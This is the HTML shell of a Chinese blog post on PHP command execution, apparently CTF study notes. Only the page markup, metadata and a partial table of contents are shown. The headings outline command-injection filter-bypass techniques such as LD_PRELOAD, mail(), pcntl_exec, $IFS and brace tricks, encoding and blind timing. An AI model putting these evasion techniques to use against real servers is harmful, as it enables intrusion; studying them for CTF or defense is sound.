
  <!DOCTYPE html>
  <html lang="zh-CN"  
    
      data-theme-mode="auto"
    
  >
  <head>
  
  <meta charset="utf-8">
  

  

  

  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://dada-06.github.io';</script>
  
  <title>
    php命令执行 |
    
    达达
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  
  
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  
    <meta name="description" content="0x01命令执行函数介绍常见函数 system   exec   passthru   shell_exec   反引号   popen   proc_open   pcntl_exec system  有回显system(string $command,int &amp;$return_var &#x3D; ?) 常用参数： command：执行command参数所指定的目录，并且输出执行结果">
<meta property="og:type" content="article">
<meta property="og:title" content="php命令执行">
<meta property="og:url" content="http://dada-06.github.io/2025/04/30/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="达达">
<meta property="og:description" content="0x01命令执行函数介绍常见函数 system   exec   passthru   shell_exec   反引号   popen   proc_open   pcntl_exec system  有回显system(string $command,int &amp;$return_var &#x3D; ?) 常用参数： command：执行command参数所指定的目录，并且输出执行结果">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_153909.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_153927.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_153954.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154005.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154053.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154119.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154211.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154303.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154344.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154433.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154513.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154610.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429194350746.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429194659782.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429194921050.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429195013370.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429195842719.png">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154813.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154833.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_154904.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_200502.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_200607.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_200618.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_201130.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_201350.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_201529.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_201559.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429203823103.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421223103445.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421223316794.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421223621079.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421150744766.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421151304944.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421151749762.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421151811509.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421151932757.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421152138076.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421152454110.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421152620707.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421152717253.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421152853353.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421153101866.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421153306972.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421153728835.png">
<meta property="og:image" content="http://dada-06.github.io/picture/qq_pic_merged_1745221195907.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421154156960.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421154552855.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421154802665.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421155351564.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421155519127.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421224339689.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421224727636.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250421225909000.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250422114101722.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250422120439083.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250422120623141.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250422202532230.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250422204357389.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250422204809434.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423195215093.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423195336637.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423195354834.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423195430751.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423195814031.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423200221727.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423200416773.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423200940153.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423202321836.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423202348671.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423202525757.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423202533828.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423205419114.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423205607725.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423205937869.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423210537457.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423211103165.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423211307372.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423211426813.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423211535294.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423211631665.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423211708274.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423212055150.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423212046698.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423212133738.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250423212356787.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427195127591.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427195513499.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427201509100.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427201615308.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427205028463.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427205615557.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427210326979.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427211506494.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427211921459.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427213051453.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427214002561.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427214015482.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250427214451152.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429205338573.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429210335757.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429210803038.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429211443415.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429214636196.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429220014180.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429214954630.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429215028692.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429220028405.png">
<meta property="og:image" content="http://dada-06.github.io/picture/image-20250429220105762.png">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_220158.jpg">
<meta property="og:image" content="http://dada-06.github.io/picture/Screenshot_20250429_220201.jpg">
<meta property="article:published_time" content="2025-04-30T04:03:11.697Z">
<meta property="article:modified_time" content="2025-05-05T10:58:51.769Z">
<meta property="article:author" content="达达">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://dada-06.github.io/picture/Screenshot_20250429_153909.jpg">
  
  
    <link rel="alternate" href="/atom.xml" title="达达" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" integrity="sha384-4NN3fZ5AokFyHuoihl7A9qWaCt+HsAtOaUsXwJGRb4&#x2F;SMBtFr2vcNSHR5E8dg0Wk" crossorigin="anonymous">

  
  
  
<meta name="generator" content="Hexo 7.3.0"></head>

  <body>
    
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi rotate">
        
          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg>
        
      </div>
      
      
        
      
      <div class="loading-word">少女祈祷中...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/">首页</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/archives">归档</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/about">关于</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/friend">友链</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
    
    
    
  </nav>
  
</div>
<header id="header">
  
    <picture></picture>
    <img  fetchpriority="high" src="/../covers/12.jpg" alt="php命令执行">
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">php命令执行</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content"  class="sidebar-right" >
          <aside id="sidebar">
  
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        
          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">文章目录</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01命令执行函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.</span> <span class="toc-text">system  有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-%E5%9B%9E%E6%98%BE%E6%9C%80%E5%90%8E%E4%B8%80%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">exec  回显最后一行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passthru-%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">1.3.</span> <span class="toc-text">passthru   有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-exec-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.</span> <span class="toc-text">shell_exec  无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popen-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.5.</span> <span class="toc-text">popen  无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#command"><span class="toc-number">1.6.</span> <span class="toc-text">command</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-open-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.7.</span> <span class="toc-text">proc_open  无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4-%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">0x02替换绕过函数过滤(过)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">0x03LD_PRELOAD绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04mail-%E5%87%BD%E6%95%B0%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">0x04mail()函数命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%E8%9A%81%E5%89%91%E5%8F%8Apcntl%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">5.</span> <span class="toc-text">0x05蚁剑及pcntl绕过函数过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#antsword"><span class="toc-number">5.1.</span> <span class="toc-text">antsword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">5.2.</span> <span class="toc-text">pcntl_exec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%93%BE%E6%8E%A5%E7%AC%A6"><span class="toc-number">6.</span> <span class="toc-text">0x06操作系统链接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">6.1.</span> <span class="toc-text">;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81-26"><span class="toc-number">6.2.</span> <span class="toc-text">&amp;   URL编码  %26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">6.3.</span> <span class="toc-text">|</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">6.4.</span> <span class="toc-text">||</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">0x07.空格过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%A7%E6%8B%AC%E5%8F%B7-car-flag-txt"><span class="toc-number">7.1.</span> <span class="toc-text">1.大括号{car,flag.txt};</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IFS%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%EF%BC%9B-IFS%E3%80%81-IFS-%E3%80%81-IFS-9"><span class="toc-number">7.2.</span> <span class="toc-text">2.$IFS代替空格；$IFS、${IFS}、$IFS$9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%87%8D%E5%AE%9A%E5%90%91%E5%AD%97%E7%AC%A6"><span class="toc-number">7.3.</span> <span class="toc-text">3.重定向字符 &lt;, &lt;&gt;;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-09-Tab-20-space"><span class="toc-number">7.4.</span> <span class="toc-text">4.%09(Tab),%20(space);</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">0x08.文件名过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6-%E7%BB%95%E8%BF%87"><span class="toc-number">8.1.</span> <span class="toc-text">1.通配符  ?  * 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">8.2.</span> <span class="toc-text">2.单引号、双引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%8D%E6%96%9C%E6%9D%A0-%E7%BB%95%E8%BF%87"><span class="toc-number">8.3.</span> <span class="toc-text">3.反斜杠  \   绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F-1%E5%88%B0-9%E3%80%81-%E5%92%8C-%E7%AD%89"><span class="toc-number">8.4.</span> <span class="toc-text">4.特殊变量:  $1到$9、$@和$*等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">8.5.</span> <span class="toc-text">5.内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">8.6.</span> <span class="toc-text">6.利用linux中的环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">8.7.</span> <span class="toc-text">0x09.常见文件读取目录绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-tac%EF%BC%9A%E5%8F%8D%E5%90%91%E6%98%BE%E7%A4%BA"><span class="toc-number">8.8.</span> <span class="toc-text">1.tac：反向显示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-more-%E4%B8%80%E9%A1%B5%E4%B8%80%E9%A1%B5%E7%9A%84%E6%98%BE%E7%A4%BA%E6%A1%A3%E6%A1%88%E5%86%85%E5%AE%B9"><span class="toc-number">8.9.</span> <span class="toc-text">2.more:一页一页的显示档案内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-less%EF%BC%9A%E4%B8%8Emore%E7%B1%BB%E4%BC%BC"><span class="toc-number">8.10.</span> <span class="toc-text">3.less：与more类似</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-tail%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%9C%AB%E5%B0%BE%E5%87%A0%E8%A1%8C%EF%BC%9B"><span class="toc-number">8.11.</span> <span class="toc-text">4.tail：查看末尾几行；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-nl%EF%BC%9A%E6%98%BE%E7%A4%BA%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E9%A1%BA%E4%BE%BF%E8%BE%93%E5%87%BA%E8%A1%8C%E5%8F%B7"><span class="toc-number">8.12.</span> <span class="toc-text">5.nl：显示的时候，顺便输出行号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-od%EF%BC%9A%E4%BB%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9A%84%E6%96%B9%E5%BC%8F%E8%AF%BB%E5%8F%96%E6%A1%A3%E6%A1%88%E5%86%85%E5%AE%B9%EF%BC%9B"><span class="toc-number">8.13.</span> <span class="toc-text">6.od：以二进制的方式读取档案内容；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-xxd%EF%BC%9A%E8%AF%BB%E5%8F%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">8.14.</span> <span class="toc-text">7.xxd：读取二进制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-sort%EF%BC%9A%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E6%8E%92%E5%BA%8F%E6%96%87%E4%BB%B6%EF%BC%9B"><span class="toc-number">8.15.</span> <span class="toc-text">8.sort：主要用于排序文件；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-uniq%EF%BC%9A%E6%8A%A5%E5%91%8A%E6%88%96%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E8%A1%8C%EF%BC%9B"><span class="toc-number">8.16.</span> <span class="toc-text">9.uniq：报告或删除文件中重复的行；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-file-f-%E6%8A%A5%E9%94%99%E5%87%BA%E5%85%B7%E4%BD%93%E5%86%85%E5%AE%B9"><span class="toc-number">8.17.</span> <span class="toc-text">10.file -f; 报错出具体内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">0x10.编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-base64%E7%BC%96%E7%A0%81"><span class="toc-number">9.1.</span> <span class="toc-text">1.base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-base32%E7%BC%96%E7%A0%81"><span class="toc-number">9.2.</span> <span class="toc-text">2.base32编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HEX%E7%BC%96%E7%A0%81"><span class="toc-number">9.3.</span> <span class="toc-text">3.HEX编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-shellcode%E7%BC%96%E7%A0%81"><span class="toc-number">9.4.</span> <span class="toc-text">4.shellcode编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.</span> <span class="toc-text">0x11无回显时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.1.</span> <span class="toc-text">命令盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">10.2.</span> <span class="toc-text">相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sleep"><span class="toc-number">10.2.1.</span> <span class="toc-text">1.sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-awk-NR"><span class="toc-number">10.2.2.</span> <span class="toc-text">2.awk NR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cut-c"><span class="toc-number">10.2.3.</span> <span class="toc-text">3.cut -c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-if%E8%AF%AD%E5%8F%A5"><span class="toc-number">10.2.4.</span> <span class="toc-text">4.if语句</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">11.</span> <span class="toc-text">0x12长度过滤绕过前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E5%92%8C-%E7%AC%A6%E5%8F%B7"><span class="toc-number">11.1.</span> <span class="toc-text">&gt;符号和 &gt;&gt;符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C"><span class="toc-number">11.2.</span> <span class="toc-text">命令换行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ls-t%E5%91%BD%E4%BB%A4"><span class="toc-number">11.3.</span> <span class="toc-text">ls -t命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sh"><span class="toc-number">11.4.</span> <span class="toc-text">sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E8%BF%90%E7%94%A8"><span class="toc-number">11.5.</span> <span class="toc-text">组合运用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 